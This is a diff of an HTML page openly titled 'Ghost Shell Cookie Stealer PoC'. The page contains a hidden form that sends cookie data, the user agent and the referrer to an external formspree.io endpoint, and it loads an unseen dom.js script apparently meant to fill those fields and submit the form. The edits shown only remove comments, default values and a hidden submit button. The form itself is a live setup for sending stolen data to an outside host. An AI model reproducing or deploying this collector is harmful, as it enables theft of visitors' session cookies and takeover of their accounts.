@@ -6,8 +6,8 @@
     <title>Ghost Shell Cookie Stealer PoC</title>
     <style>
         body {
-            background-color: black; /* Black background */
-            color: white; /* Default text color */
+            background-color: black;
+            color: white;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,11 +17,11 @@
         }
         h2 {
             text-align: center;
-            color: gold; /* Gold text */
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); /* Glowing effect */
+            color: gold;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
         }
         form {
-            display: none; /* Hidden form */
+            display: none;
         }
     </style>
 </head>
@@ -30,11 +30,10 @@
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
 
     <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
-        <input type="hidden" name="cookie_data" id="cookieField" value="default_cookie">
-        <input type="hidden" name="user_agent" id="userAgentField" value="default_agent">
-        <input type="hidden" name="referrer" id="referrerField" value="default_referrer">
-        <input type="hidden" name="fallback" value="not_empty"> <!-- Prevents empty form rejection -->
-<button type="submit" name="submitButton" style="display: none;">Send</button>
+        <input type="hidden" name="cookie_data" id="cookieField">
+        <input type="hidden" name="user_agent" id="userAgentField">
+        <input type="hidden" name="referrer" id="referrerField">
+        <input type="hidden" name="fallback" value="not_empty">
     </form>
 
     <script src="dom.js"></script>
